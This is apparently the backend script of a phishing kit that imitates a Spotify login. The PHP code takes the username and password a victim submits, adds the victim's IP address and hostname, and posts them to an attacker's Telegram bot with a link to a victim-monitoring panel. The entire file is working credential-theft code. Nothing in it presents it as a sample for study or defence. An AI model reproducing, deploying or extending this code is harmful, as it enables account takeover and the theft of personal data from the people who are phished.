<?php
// Include config.php to access API and chat IDs
include '../config.php';

// Get the message and login credentials from the POST request
$data = json_decode(file_get_contents('php://input'), true);
$message = $data['message'];
$username = $data['username'];
$password = $data['password'];

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

// Generate panel URL
$panel = str_replace('web/sys/login.php', '', "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] . "panel/view.php?vip=$ip");

// Updated Telegram message style
$telegramMessage = "🔔 [📱] LOGIN SPOTIFY +1 [📱] 🔔\r\n";
$telegramMessage .= "👤 Username: $username\r\n";
$telegramMessage .= "🔑 Password: $password\r\n";
$telegramMessage .= "🌍 IP Address: $ip\r\n"; // Added IP address line
$telegramMessage .= "🖥️ Hostname: $hostname\r\n"; // Added hostname line
$telegramMessage .= "\r\n";
$telegramMessage .= "🚀 POWRED BY 404 🚀\r\n";

// Keyboard with inline button
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '🌍 View Panel', 'url' => $panel] // Use the generated panel URL
        ]
    ]
];

// Send message to Telegram with the keyboard
$url = "https://api.telegram.org/bot$api/sendMessage"; // Use $api from config.php
$postData = [
    'chat_id' => $chatid, // Use $chatid from config.php
    'text' => $telegramMessage,
    'reply_markup' => json_encode($keyboard) // Include the keyboard here
];

$options = [
    'http' => [
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query($postData)
    ]
];

$context  = stream_context_create($options);
$result = file_get_contents($url, false, $context);

if ($result === FALSE) {
    // Handle error
    echo json_encode(['status' => 'error', 'message' => 'Failed to send message']);
} else {
    // Success
    echo json_encode(['status' => 'success', 'message' => 'Message sent']);
}
?>